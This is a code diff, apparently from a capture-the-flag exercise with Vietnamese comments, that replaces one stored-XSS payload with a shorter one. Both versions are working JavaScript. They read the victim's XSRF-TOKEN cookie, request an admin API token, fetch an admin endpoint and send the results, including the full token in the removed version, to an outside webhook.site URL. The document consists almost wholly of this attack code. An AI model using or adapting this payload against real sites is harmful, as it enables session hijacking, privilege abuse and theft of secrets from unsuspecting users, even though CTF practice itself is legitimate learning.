@@ -1,120 +1,41 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <title>Get Flag Payload</title>
-    <!-- VERSION_GET_FLAG_V1 -->
-    <meta name="description" content='<script>
-        (function() {
-            var webhook_id = "daa6c589-39a4-45ab-a988-b68cff448c30";
-            var attacker_url = "https://webhook.site/" + webhook_id;
-            var loc = window.location.href;
+<script>
+(async () => {
+  const webhook = 'https://webhook.site/daa6c589-39a4-45ab-a988-b68cff448c30';
 
-            function sendPing(data) {
-                var params = new URLSearchParams();
-                params.append("source_tag", "name:description_GET_FLAG_V1");
-                for (var key in data) { 
-                    let val_str = String(data[key]);
-                    params.append(key, val_str.substring(0,1000)); // Tăng giới hạn lên 1000 cho flag
-                }
-                new Image().src = attacker_url + "?" + params.toString();
-            }
+  // Lấy XSRF token từ cookie
+  const token = (document.cookie.match(/XSRF-TOKEN=([^;]+)/) || [])[1];
+  if (!token) return fetch(webhook + '?error=no_xsrf_token');
 
-            var xsrfTokenValue = null;
-            try {
-                var cookies = document.cookie.split(";");
-                for (var i = 0; i < cookies.length; i++) {
-                    var cookie = cookies[i].trim();
-                    if (cookie.startsWith("XSRF-TOKEN=")) {
-                        xsrfTokenValue = decodeURIComponent(cookie.substring("XSRF-TOKEN=".length));
-                        break;
-                    }
-                }
-            } catch (e_cookie) {
-                sendPing({ stage: "cookie_parse_error", error: e_cookie.message });
-                return; 
-            }
+  try {
+    // Bước 1: Lấy API token
+    const r1 = await fetch('/generate-token', {
+      method: 'POST',
+      headers: {
+        'X-Requested-With': 'XMLHttpRequest',
+        'X-XSRF-TOKEN': decodeURIComponent(token),
+        'Accept': 'application/json'
+      }
+    });
+    const j1 = await r1.json();
+    const apiToken = j1.token;
 
-            if (!xsrfTokenValue) {
-                sendPing({ stage: "xsrf_token_missing", loc: loc });
-                return; 
-            }
-            
-            sendPing({ stage: "script_start_get_flag", loc: loc, xsrf_preview: xsrfTokenValue.substring(0,20) });
+    // Bước 2: Lấy flag
+    const r2 = await fetch('/api/admin/sup3rs3cr3t', {
+      headers: {
+        'Authorization': 'Bearer ' + apiToken,
+        'X-Requested-With': 'XMLHttpRequest',
+        'Accept': 'application/json'
+      }
+    });
+    const flag = await r2.text();
 
-            // Bước 1: Lấy API Token
-            fetch("/generate-token", {
-                method: "POST",
-                headers: {
-                    "Accept": "application/json",
-                    "X-Requested-With": "XMLHttpRequest",
-                    "X-XSRF-TOKEN": xsrfTokenValue
-                }
-            })
-            .then(response => {
-                if (!response.ok) { // Xử lý lỗi ngay nếu không OK
-                    var status_code = response.status;
-                    return response.text().then(text_body => { // Lấy text body của lỗi
-                        sendPing({ stage: "gen_token_FAIL", status: status_code, body: text_body });
-                        throw new Error("GenTokenFailStatus: " + status_code); 
-                    });
-                }
-                return response.json(); 
-            })
-            .then(data => { // data từ /generate-token
-                if (data && data.token) {
-                    var adminApiToken = data.token;
-                    sendPing({ 
-                        stage: "got_api_token_SUCCESS", 
-                        full_token: adminApiToken, 
-                        user_name: data.user ? data.user.name : "N/A"
-                    });
-
-                    // Bước 2: Dùng API Token để lấy FLAG_2
-                    return fetch("/api/admin/sup3rs3cr3t", {
-                        method: "GET",
-                        headers: {
-                            "Accept": "application/json",
-                            "Authorization": "Bearer " + adminApiToken, // QUAN TRỌNG!
-                            "X-Requested-With": "XMLHttpRequest"
-                        }
-                    });
-                } else {
-                    sendPing({ stage: "gen_token_SUCCESS_but_no_token_field", received_data: JSON.stringify(data) });
-                    throw new Error("No token field in generate-token response");
-                }
-            })
-            .then(response => { // response từ /api/admin/sup3rs3cr3t
-                if (!response.ok) { // Xử lý lỗi ngay nếu không OK
-                    var status_code_flag = response.status;
-                     return response.text().then(text_body_flag => {
-                        sendPing({ stage: "get_flag_FAIL", status: status_code_flag, body: text_body_flag });
-                        throw new Error("GetFlagFailStatus: " + status_code_flag);
-                    });
-                }
-                return response.json();
-            })
-            .then(flagData => { // flagData từ /api/admin/sup3rs3cr3t
-                sendPing({ 
-                    stage: "FLAG2_RETRIEVED_SUCCESS", 
-                    flag_payload: JSON.stringify(flagData) // Gửi toàn bộ JSON chứa flag
-                });
-            })
-            .catch(error => {
-                sendPing({ 
-                    stage: "overall_CATCH_ERROR", 
-                    error_message: error.message, 
-                    error_details_str: error.toString() 
-                });
-            });
-        })();
-    </script>'>
-</head>
-<body>
-    <h1>Get Flag Payload Page</h1>
-</body>
-</html>
-Beta
-0 / 0
-used queries
-1
+    // Gửi flag về webhook
+    fetch(webhook, {
+      method: 'POST',
+      body: flag
+    });
+  } catch (e) {
+    fetch(webhook + '?error=' + encodeURIComponent(e.message));
+  }
+})();
+</script>
